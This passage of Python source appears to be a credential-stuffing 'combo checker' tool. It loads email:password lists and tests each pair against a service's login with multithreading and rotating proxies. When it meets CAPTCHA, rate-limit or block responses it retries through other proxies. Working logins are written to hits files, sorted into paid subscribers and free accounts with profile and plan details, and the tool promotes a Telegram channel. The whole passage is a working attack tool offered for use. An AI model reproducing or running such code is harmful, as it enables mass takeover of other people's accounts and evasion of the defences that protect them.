                err_type.startswith("network:") or err_type.startswith("http_")):
            with Eyelifter_stats_lock:
                Eyelifter_stats["retries"] += 1
            if proxy:
                Eyelifter_mark_bad_proxy(proxy)
            time.sleep(CONFIG.get("retry_delay", 2))
            continue

        time.sleep(CONFIG.get("retry_delay", 2))

    with Eyelifter_stats_lock:
        Eyelifter_stats["checked"] += 1
        checked = Eyelifter_stats["checked"]
        total = Eyelifter_total_combos
        status = result.get("status", "unknown") if result else "error"

        if status == "valid":
            user = result.get("user", {}) or {}
            is_free = result.get("is_free", False)
            line = Eyelifter_format_hit(email, password, user, is_free=is_free)
            if is_free:
                Eyelifter_stats["free"] += 1
                with Eyelifter_print_lock:
                    print(f"[{checked}/{total}] {line}")
                if Eyelifter_free_file:
                    with Eyelifter_file_lock:
                        Eyelifter_free_file.write(line + "\n\n")
                        Eyelifter_free_file.flush()
            else:
                Eyelifter_stats["hits"] += 1
                with Eyelifter_print_lock:
                    print(f"[{checked}/{total}] {line}")
                if Eyelifter_hits_file:
                    with Eyelifter_file_lock:
                        Eyelifter_hits_file.write(line + "\n\n")
                        Eyelifter_hits_file.flush()
        elif status == "bad":
            Eyelifter_stats["bad"] += 1
            msg = result.get("message", "invalid credentials") if result else "no result"
            with Eyelifter_print_lock:
                print(f"[{checked}/{total}] {email} - ❌ bad: {msg}")
        else:
            Eyelifter_stats["errors"] += 1
            err_type = result.get("error_type", "") if result else ""
            msg = result.get("message", "unknown error") if result else "no result"
            tag = f"[{err_type}]" if err_type else ""
            line = f"⚠️ ERROR {email}:{password} | {err_type or 'error'} | {msg}"
            with Eyelifter_print_lock:
                print(f"[{checked}/{total}] {email} - ⚠️ Error {tag}: {msg}")
            if Eyelifter_errors_file:
                with Eyelifter_file_lock:
                    Eyelifter_errors_file.write(line + "\n")
                    Eyelifter_errors_file.flush()

    combo_delay = CONFIG.get("combo_delay", 0.5)
    if combo_delay > 0:
        time.sleep(combo_delay)
    Eyelifter_update_title()


def Eyelifter_settings_menu():
    Eyelifter_verify("sm")
    Eyelifter_section("SETTINGS")
    print(Eyelifter_color("96", "Current Settings:"))
    print(f"  Threads: {CONFIG['threads']} (1-20)")
    print(f"  Timeout: {CONFIG['timeout']}s")
    print(f"  Retries: {CONFIG['retries']}")
    print(f"  Retry Delay: {CONFIG['retry_delay']}s")
    print(f"  Combo Delay: {CONFIG['combo_delay']}s")
    print(f"  Rate Limit Backoff: {CONFIG['rate_limit_backoff']}s")
    print(f"  Block Backoff: {CONFIG['block_backoff']}s")
    print(f"  Max Proxy Retries: {CONFIG['max_proxy_retries']}")
    print(f"  Proxy File: {CONFIG['proxies_file']}")
    print(f"  Debug: {CONFIG['debug']}")
    print()
    print(Eyelifter_color("93", "[1] Change Threads (1-20)"))
    print(Eyelifter_color("93", "[2] Change Timeout"))
    print(Eyelifter_color("93", "[3] Change Retries"))
    print(Eyelifter_color("93", "[4] Change Retry Delay"))
    print(Eyelifter_color("93", "[5] Change Combo Delay"))
    print(Eyelifter_color("93", "[6] Toggle Debug"))
    print(Eyelifter_color("93", "[7] Back"))

    choice = input(f"{Eyelifter_color('96', '[*] Select: ')}").strip()
    if choice == "1":
        try:
            val = int(input("Threads (1-20): "))
            CONFIG["threads"] = max(1, min(20, val))
            Eyelifter_log("✅", "INFO", "CONFIG", f"threads set to {CONFIG['threads']}")
        except Exception:
            Eyelifter_log("❌", "ERROR", "CONFIG", "invalid value")
    elif choice == "2":
        try:
            val = int(input("Timeout (5-60): "))
            CONFIG["timeout"] = max(5, min(60, val))
            Eyelifter_log("✅", "INFO", "CONFIG", f"timeout set to {CONFIG['timeout']}")
        except Exception:
            Eyelifter_log("❌", "ERROR", "CONFIG", "invalid value")
    elif choice == "3":
        try:
            val = int(input("Retries (0-5): "))
            CONFIG["retries"] = max(0, min(5, val))
            Eyelifter_log("✅", "INFO", "CONFIG", f"retries set to {CONFIG['retries']}")
        except Exception:
            Eyelifter_log("❌", "ERROR", "CONFIG", "invalid value")
    elif choice == "4":
        try:
            val = float(input("Retry delay (seconds): "))
            CONFIG["retry_delay"] = max(0, val)
            Eyelifter_log("✅", "INFO", "CONFIG", f"retry delay set to {CONFIG['retry_delay']}s")
        except Exception:
            Eyelifter_log("❌", "ERROR", "CONFIG", "invalid value")
    elif choice == "5":
        try:
            val = float(input("Combo delay (seconds): "))
            CONFIG["combo_delay"] = max(0, val)
            Eyelifter_log("✅", "INFO", "CONFIG", f"combo delay set to {CONFIG['combo_delay']}s")
        except Exception:
            Eyelifter_log("❌", "ERROR", "CONFIG", "invalid value")
    elif choice == "6":
        CONFIG["debug"] = not CONFIG["debug"]
        global DEBUG
        DEBUG = CONFIG["debug"]
        Eyelifter_log("✅", "INFO", "CONFIG", f"debug set to {CONFIG['debug']}")


def Eyelifter_single_check(proxies):
    Eyelifter_verify("scm")
    Eyelifter_section("SINGLE CHECK")
    combo = input(f"{Eyelifter_color('96', '[*] Enter email:password: ')}").strip()
    if ":" not in combo:
        Eyelifter_log("❌", "ERROR", "INPUT", "invalid format. use email:password")
        return

    proxy = Eyelifter_pick_proxy() if Eyelifter_proxy_pool else (random.choice(proxies) if proxies else None)
    if proxy:
        Eyelifter_log("🌐", "INFO", "PROXY", "using proxy")

    Eyelifter_log("🔍", "STEP", "CHECK", f"checking {combo.split(':')[0]}...")
    start = time.time()
    email, password = combo.split(":", 1)
    checker = EyelifterHumanizer()

    max_attempts = CONFIG.get("retries", 3) + 1
    rate_limit_hits = 0
    result = None
    last_proxy = proxy
    csrf_failure = False

    for attempt in range(max_attempts):
        if attempt > 0:
            checker.Eyelifter_rotate()
            new_proxy = Eyelifter_pick_proxy(exclude=last_proxy) or (random.choice(proxies) if proxies else None)
            if new_proxy:
                proxy = new_proxy
        last_proxy = proxy

        result = checker.Eyelifter_check(email.strip(), password.strip(), proxy, use_seed=csrf_failure)
        status = result.get("status", "unknown")
        err_type = result.get("error_type", "")

        if err_type in ("no_csrf_in_body", "csrf_parse"):
            csrf_failure = True
        elif status in ("valid", "bad") or err_type == "creds":
            csrf_failure = False

        if status in ("valid", "bad") or err_type == "creds":
            break

        if err_type == "captcha":
            if proxy:
                Eyelifter_mark_bad_proxy(proxy)
            if attempt >= 2:
                break
            time.sleep(RATE_LIMIT_BACKOFF)
            continue

        if err_type == "rate_limit":
            rate_limit_hits += 1
            if rate_limit_hits > MAX_RATE_LIMIT_RETRIES:
                break
            backoff = RATE_LIMIT_BACKOFF * (2 ** (rate_limit_hits - 1))
            Eyelifter_log("⏳", "WARN", "RATE-LIMIT", f"backoff {backoff}s")
            time.sleep(backoff)
            if proxy:
                Eyelifter_mark_bad_proxy(proxy)
            continue

        if err_type == "block":
            if proxy:
                Eyelifter_mark_bad_proxy(proxy)
            time.sleep(BLOCK_BACKOFF)
            continue

        if err_type in ("proxy", "timeout", "network", "no_session", "csrf_parse",
                        "no_csrf_in_body", "form_not_parsed") or \
                err_type.startswith("network:") or err_type.startswith("http_"):
            if proxy:
                Eyelifter_mark_bad_proxy(proxy)
            time.sleep(CONFIG.get("retry_delay", 2))
            continue

        time.sleep(CONFIG.get("retry_delay", 2))

    elapsed = time.time() - start

    if result and result.get("status") == "valid":
        u = result.get("user", {}) or {}
        is_free = result.get("is_free", False)
        verdict = "🆓 FREE" if is_free else "✅ SUBSCRIBER"
        rows = [
            ("Status", verdict),
            ("Email", email.strip()),
            ("Password", password.strip()),
            ("Name", u.get("name", "-")),
            ("First Name", u.get("first_name", "-")),
            ("Last Name", u.get("last_name", "-")),
            ("Plan", u.get("plan", "-")),
            ("Subscriber", str(u.get("is_paid", False)).lower()),
            ("Usage Used", u.get("usage_used", 0)),
            ("Usage Limit", u.get("usage_limit", 0)),
            ("Usage Left", u.get("usage_remaining", 0)),
            ("Rate Limit", f"{u.get('rate_limit', 0)}/mo"),
            ("User Group", u.get("user_group", "-")),
            ("Origin", u.get("origin_source", "-")),
            ("Invite Code", u.get("invite_code", "-")),
            ("User ID", u.get("user_id", "-")),
            ("Time", f"{elapsed:.2f}s"),
            ("Checked By", AUTHOR_TAG),
        ]
        print()
        Eyelifter_summary(rows)
    else:
        status = result.get("status", "Unknown") if result else "no response"
        err_type = result.get("error_type", "") if result else ""
        msg = result.get("message", "no details") if result else "all retries exhausted"
        tag = f"[{err_type}]" if err_type else ""
        Eyelifter_log("❌", "ERROR", "RESULT", f"{status} {tag} – {msg}")

    input(f"{Eyelifter_color('93', '[*] Press Enter to continue...')}")


def Eyelifter_bulk_check(proxies):
    Eyelifter_verify("bcm")
    global Eyelifter_total_combos, Eyelifter_proxy_pool, Eyelifter_bad_proxies
    global Eyelifter_hits_file, Eyelifter_free_file, Eyelifter_errors_file, Eyelifter_session_folder

    Eyelifter_reset_stats()
    Eyelifter_section("BULK CHECK")
    filepath = input(f"{Eyelifter_color('96', '[*] Enter combo file path: ')}").strip()
    if not filepath or not os.path.isfile(filepath):
        Eyelifter_log("❌", "ERROR", "FILE", "file not found")
        return

    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()

    combos_set = Eyelifter_extract_combos(content)
    if not combos_set:
        Eyelifter_log("❌", "ERROR", "EXTRACT", "no valid combos found in the file.")
        return

    combos = sorted(combos_set)
    Eyelifter_log("✅", "INFO", "EXTRACT", f"extracted {len(combos)} unique combos.")

    os.makedirs(RESULTS_FOLDER, exist_ok=True)
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    Eyelifter_session_folder = os.path.join(RESULTS_FOLDER, f"Session_{timestamp}")
    os.makedirs(Eyelifter_session_folder, exist_ok=True)

    hits_path = os.path.join(Eyelifter_session_folder, "humanizer_hits.txt")
    free_path = os.path.join(Eyelifter_session_folder, "humanizer_free.txt")
    errors_path = os.path.join(Eyelifter_session_folder, "humanizer_errors.txt")

    Eyelifter_hits_file = open(hits_path, "w", encoding="utf-8")
    Eyelifter_free_file = open(free_path, "w", encoding="utf-8")
    Eyelifter_errors_file = open(errors_path, "w", encoding="utf-8")

    header = (f"# Humanizer Checker Results - {datetime.now().isoformat()}\n"
              f"# Checked by {AUTHOR_TAG}\n\n")
    Eyelifter_hits_file.write(header)
    Eyelifter_free_file.write(header)
    Eyelifter_errors_file.write(header)

    Eyelifter_total_combos = len(combos)

    Eyelifter_log("📊", "INFO", "FILE", f"loaded {Eyelifter_total_combos} combos")
    Eyelifter_log("⚙️", "INFO", "CONFIG",
                  f"threads: {CONFIG['threads']} | timeout: {CONFIG['timeout']}s | "
                  f"retries: {CONFIG['retries']} | combo delay: {CONFIG['combo_delay']}s | debug: {CONFIG['debug']}")

    working_proxies = Eyelifter_get_working_proxies(proxies) if proxies else []
    Eyelifter_proxy_pool = working_proxies
    Eyelifter_bad_proxies.clear()

    max_threads = CONFIG["threads"]
    sem = threading.BoundedSemaphore(max_threads)

    def Eyelifter_worker(combo):
        if Eyelifter_stop_event.is_set():
            return
        try:
            sem.acquire()
            proxy = Eyelifter_pick_proxy()
            Eyelifter_process_combo(combo, proxy)
        finally:
            sem.release()

    threads = []
    for combo in combos:
        if Eyelifter_stop_event.is_set():
            break
        t = threading.Thread(target=Eyelifter_worker, args=(combo,))
        t.daemon = True
        t.start()
        threads.append(t)
        time.sleep(0.01)

    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        Eyelifter_stop_event.set()
        Eyelifter_log("🛑", "WARN", "STOP", "stopping... waiting for threads to finish")
        for t in threads:
            t.join(timeout=2)

    Eyelifter_hits_file.close()
    Eyelifter_free_file.close()
    Eyelifter_errors_file.close()

    old_hits = os.path.join(Eyelifter_session_folder, "humanizer_hits.txt")
    new_hits = os.path.join(Eyelifter_session_folder, f"humanizer_hits_{Eyelifter_stats['hits']}.txt")
    if os.path.exists(old_hits):
        os.rename(old_hits, new_hits)

    old_free = os.path.join(Eyelifter_session_folder, "humanizer_free.txt")
    new_free = os.path.join(Eyelifter_session_folder, f"humanizer_free_{Eyelifter_stats['free']}.txt")
    if os.path.exists(old_free):
        os.rename(old_free, new_free)

    old_errors = os.path.join(Eyelifter_session_folder, "humanizer_errors.txt")
    new_errors = os.path.join(Eyelifter_session_folder, f"humanizer_errors_{Eyelifter_stats['errors']}.txt")
    if os.path.exists(old_errors):
        os.rename(old_errors, new_errors)

    Eyelifter_log("💾", "INFO", "SAVE", f"results saved to {Eyelifter_session_folder}")

    Eyelifter_divider()
    elapsed = time.time() - Eyelifter_start_time
    Eyelifter_summary([
        ("Total", Eyelifter_total_combos),
        ("Hits (subscriber)", Eyelifter_stats["hits"]),
        ("Free accounts", Eyelifter_stats["free"]),
        ("Bad", Eyelifter_stats["bad"]),
        ("Errors", Eyelifter_stats["errors"]),
        ("Rate Limited", Eyelifter_stats["rate_limited"]),
        ("Captcha Blocks", Eyelifter_stats["captcha"]),
        ("Blocks", Eyelifter_stats["blocks"]),
        ("Proxy Fails", Eyelifter_stats["proxy_fails"]),
        ("Retries", Eyelifter_stats["retries"]),
        ("Time", f"{elapsed:.1f}s"),
        ("Folder", Eyelifter_session_folder),
    ])
    input(f"{Eyelifter_color('93', '[*] Press Enter to continue...')}")


def Eyelifter_main():
    Eyelifter_verify("main")
    threading.Thread(
        target=Eyelifter_open_url,
        args=("https://t.me/darkhuchannel",),
        daemon=True,
    ).start()
    Eyelifter_banner(TOOL_NAME, "Humanizer Combos Checker")
    proxies = Eyelifter_load_proxies()

    while True:
        Eyelifter_section("MAIN MENU")
        if proxies:
            Eyelifter_log("🌐", "INFO", "PROXY", f"{len(proxies)} proxies loaded")
        else:
            Eyelifter_log("⚠️", "WARN", "PROXY", "no proxies - direct connection")

        print(Eyelifter_color("96", "[1] Single check"))
        print(Eyelifter_color("96", "[2] Bulk check from file"))
        print(Eyelifter_color("96", "[3] Settings"))
        print(Eyelifter_color("96", "[4] Exit"))

        choice = input(f"{Eyelifter_color('93', '[*] Select: ')}").strip()

        if choice == "1":
            Eyelifter_single_check(proxies)
        elif choice == "2":
            Eyelifter_stop_event.clear()
            Eyelifter_bulk_check(proxies)
        elif choice == "3":
            Eyelifter_settings_menu()
        elif choice == "4":
            print("Exiting...")
            break
        else:
            Eyelifter_log("❌", "ERROR", "INPUT", "invalid choice")


if __name__ == "__main__":
    try:
        Eyelifter_main()
    except SystemExit:
        raise
    except KeyboardInterrupt:
        print("\nSad...")
        sys.exit(1)